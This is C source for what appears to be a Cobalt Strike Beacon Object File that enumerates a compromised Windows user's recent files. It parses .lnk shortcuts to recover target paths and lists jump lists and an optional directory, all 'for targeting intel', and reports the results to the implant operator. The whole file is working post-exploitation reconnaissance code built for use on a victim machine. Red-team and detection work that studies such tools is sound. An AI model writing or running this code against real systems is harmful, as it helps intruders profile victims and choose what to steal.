/*
 * bof-recentfiles [extra-dir]
 *
 * Enumerate recently used files for targeting intel:
 *   - %APPDATA%\Microsoft\Windows\Recent\*.lnk  (with target resolution)
 *   - AutomaticDestinations / CustomDestinations jump lists (app IDs)
 *   - an optional extra directory
 *
 * LNK targets are parsed from the LinkInfo block (most local files); links
 * that only carry an IDList are printed without a target.  Jump lists are
 * listed as files: the embedded LNK streams need a full parser and are out of
 * scope.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static unsigned int le16(const unsigned char *p) { return p[0] | ((unsigned int)p[1] << 8); }
static unsigned int le32(const unsigned char *p)
{
    return p[0] | ((unsigned int)p[1] << 8) | ((unsigned int)p[2] << 16) |
           ((unsigned int)p[3] << 24);
}

/* Extract the local base path + common suffix out of a .lnk file. */
static int lnk_target(const unsigned char *b, unsigned int n, char *out, int outsz)
{
    unsigned int flags, off, li, lisize, hdrsize;
    unsigned int lbp, cps, lbpu = 0, cpsu = 0;

    out[0] = 0;
    if (n < 0x4c || le32(b) != 0x4c ||
        b[4] != 0x4c || b[5] != 0x00 || b[6] != 0x00 || b[7] != 0x00)
        return -1;

    flags = le32(b + 0x14);
    if (!(flags & 0x02)) return -1;      /* no LinkInfo */

    off = 0x4c;
    if (flags & 0x01) {                  /* LinkTargetIDList first */
        if (off + 2 > n) return -1;
        off += 2 + le16(b + off);
    }
    if (off + 0x1c > n) return -1;
    li = off;
    lisize = le32(b + li);
    hdrsize = le32(b + li + 4);
    if (lisize < 0x1c || li + lisize > n) return -1;

    lbp = le32(b + li + 16);
    cps = le32(b + li + 20);
    if (hdrsize >= 0x24 && li + 28 <= n) {
        lbpu = le32(b + li + 24);
        cpsu = le32(b + li + 28);
    }

    if (lbpu && li + lbpu < li + lisize) {
        wchar_t w[512];
        int i;
        for (i = 0; i < 511; i++) {
            unsigned char lo = b[li + lbpu + i * 2];
            unsigned char hi = b[li + lbpu + i * 2 + 1];
            if (li + lbpu + i * 2 + 1 >= li + lisize) break;
            w[i] = (wchar_t)(lo | ((unsigned short)hi << 8));
            if (!w[i]) break;
        }
        w[i] = 0;
        bof_w2a(w, out, outsz);
        if (cpsu && li + cpsu < li + lisize) {
            for (i = 0; i < 511; i++) {
                unsigned char lo = b[li + cpsu + i * 2];
                unsigned char hi = b[li + cpsu + i * 2 + 1];
                if (li + cpsu + i * 2 + 1 >= li + lisize) break;
                w[i] = (wchar_t)(lo | ((unsigned short)hi << 8));
                if (!w[i]) break;
            }
            w[i] = 0;
            bof_strncat(out, "\\", outsz - bof_strlen(out) - 1);
            {
                char suffix[512];
                bof_w2a(w, suffix, sizeof(suffix));
                bof_strncat(out, suffix, outsz - bof_strlen(out) - 1);
            }
        }
        return out[0] ? 0 : -1;
    }

    if (lbp && li + lbp < li + lisize) {
        int i = 0;
        while (li + lbp + i < li + lisize && b[li + lbp + i] &&
               i < outsz - 1) {
            out[i] = (char)b[li + lbp + i];
            i++;
        }
        out[i] = 0;
        if (cps && li + cps < li + lisize) {
            bof_strncat(out, "\\", outsz - bof_strlen(out) - 1);
            i = 0;
            while (li + cps + i < li + lisize && b[li + cps + i] &&
                   i < 255) {
                char c = (char)b[li + cps + i];
                bof_strncat(out, (char[]){c, 0}, 2);
                i++;
            }
        }
        return out[0] ? 0 : -1;
    }
    return -1;
}

static void print_lnk(const char *path, const char *name,
                      const WIN32_FIND_DATAA *fd)
{
    unsigned char *data = NULL;
    unsigned int size = 0;
    char target[1024];
    char when[32];

    bof_ft_str(((unsigned long long)fd->ftLastWriteTime.dwHighDateTime << 32) |
               fd->ftLastWriteTime.dwLowDateTime, when, sizeof(when));

    target[0] = 0;
    if (bof_read_file(path, &data, &size) == 0) {
        lnk_target(data, size, target, sizeof(target));
        KERNEL32$VirtualFree(data, 0, MEM_RELEASE);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "  %-40.40s %s\n", name, when);
    if (target[0])
        BeaconPrintf(CALLBACK_OUTPUT, "      -> %s\n", target);
    else
        BeaconPrintf(CALLBACK_OUTPUT, "      -> (target only in IDList)\n");
}

static void scan_dir(const char *dir, int only_lnk, int limit, int *shown)
{
    char pattern[MAX_PATH + 8], path[MAX_PATH + 8];
    WIN32_FIND_DATAA fd;
    HANDLE h;

    bof_strncpy(pattern, dir, sizeof(pattern));
    bof_strncat(pattern, "\\*", sizeof(pattern) - bof_strlen(pattern) - 1);
    h = KERNEL32$FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    do {
        if (bof_strcmp(fd.cFileName, ".") == 0 ||
            bof_strcmp(fd.cFileName, "..") == 0)
            continue;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (*shown >= limit) break;

        if (only_lnk) {
            int n = bof_strlen(fd.cFileName);
            if (n < 4 || bof_stricmp(fd.cFileName + n - 4, ".lnk") != 0)
                continue;
        }

        bof_strncpy(path, dir, sizeof(path));
        bof_strncat(path, "\\", sizeof(path) - bof_strlen(path) - 1);
        bof_strncat(path, fd.cFileName, sizeof(path) - bof_strlen(path) - 1);

        if (only_lnk) {
            print_lnk(path, fd.cFileName, &fd);
        } else {
            char when[32];
            bof_ft_str(((unsigned long long)fd.ftLastWriteTime.dwHighDateTime << 32) |
                       fd.ftLastWriteTime.dwLowDateTime, when, sizeof(when));
            BeaconPrintf(CALLBACK_OUTPUT, "  %-48.48s %s\n", fd.cFileName, when);
        }
        (*shown)++;
    } while (KERNEL32$FindNextFileA(h, &fd));

    KERNEL32$FindClose(h);
}

void go(char *args, int alen)
{
    datap parser;
    char *extra = "";
    int elen = 0, shown = 0;
    char base[512], sub[512];

    BeaconDataParse(&parser, args, alen);
    extra = BeaconDataExtract(&parser, &elen);
    if (!extra) extra = "";

    BeaconPrintf(CALLBACK_OUTPUT, "================ recent files ================\n");

    if (KERNEL32$ExpandEnvironmentStringsA(
            "%APPDATA%\\Microsoft\\Windows\\Recent", base, sizeof(base))) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] %s\n", base);
        scan_dir(base, 1, 200, &shown);

        bof_strncpy(sub, base, sizeof(sub));
        bof_strncat(sub, "\\AutomaticDestinations", sizeof(sub) - bof_strlen(sub) - 1);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] %s (jump lists)\n", sub);
        scan_dir(sub, 0, 100, &shown);

        bof_strncpy(sub, base, sizeof(sub));
        bof_strncat(sub, "\\CustomDestinations", sizeof(sub) - bof_strlen(sub) - 1);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] %s (jump lists)\n", sub);
        scan_dir(sub, 0, 100, &shown);
    }

    if (extra[0]) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] %s\n", extra);
        scan_dir(extra, 0, 100, &shown);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] %d entr%s\n", shown, shown == 1 ? "y" : "ies");
}
